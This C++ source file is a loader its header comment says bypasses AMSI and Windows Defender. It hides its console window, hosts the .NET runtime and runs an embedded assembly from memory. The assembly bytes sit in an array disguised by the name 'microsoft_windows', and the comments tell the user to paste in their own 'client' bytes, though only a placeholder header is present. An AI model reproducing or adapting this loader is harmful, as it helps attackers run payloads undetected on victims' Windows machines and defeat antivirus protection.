#include "stdafx.h" // Created By etormadiv Edited By Bashar Bachir => Bypass AMSI Windows Defender
unsigned char microsoft_windows[16896] = { // Length Of Your Client + It's Bytes => Use HxD Software
	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	
};

int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)

{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	ICLRMetaHost* p_meta_host = nullptr;
	auto hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<VOID * *>(&p_meta_host));
	ICLRRuntimeInfo* p_runtime_info = nullptr;
	hr = p_meta_host->GetRuntime(L"v2.0.50727", IID_ICLRRuntimeInfo, reinterpret_cast<VOID * *>(&p_runtime_info));
	BOOL b_loadable;
	hr = p_runtime_info->IsLoadable(&b_loadable);
	ICorRuntimeHost* p_runtime_host = nullptr;
	hr = p_runtime_info->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<VOID * *>(&p_runtime_host));
	hr = p_runtime_host->Start();
	IUnknownPtr p_app_domain_thunk = NULL;
	hr = p_runtime_host->GetDefaultDomain(&p_app_domain_thunk);
	_AppDomainPtr p_default_app_domain = NULL;
	hr = p_app_domain_thunk->QueryInterface(__uuidof(_AppDomain), reinterpret_cast<VOID * *>(&p_default_app_domain));
	_AssemblyPtr p_assembly = NULL;
	SAFEARRAYBOUND rgsabound[1];
	rgsabound[0].cElements = 16896; // Length Of Your Client => Use HxD Software
	rgsabound[0].lLbound = 0;
	const auto p_safe_array = SafeArrayCreate(VT_UI1, 1, rgsabound);
	void* pv_data = nullptr;
	hr = SafeArrayAccessData(p_safe_array, &pv_data);
	memcpy(pv_data, microsoft_windows, 16896); // Length Of Your Client => Use HxD Software
	hr = SafeArrayUnaccessData(p_safe_array);
	hr = p_default_app_domain->Load_3(p_safe_array, &p_assembly);
	_MethodInfoPtr p_method_info = NULL;
	hr = p_assembly->get_EntryPoint(&p_method_info);
	VARIANT ret_val;
	ZeroMemory(&ret_val, sizeof(VARIANT));
	VARIANT obj;
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt = VT_NULL;
	const auto psa_static_method_args = SafeArrayCreateVector(VT_VARIANT, 0, 0);
	hr = p_method_info->Invoke_3(obj, psa_static_method_args, &ret_val);
	while(true)
	{ }
	return 0;
}
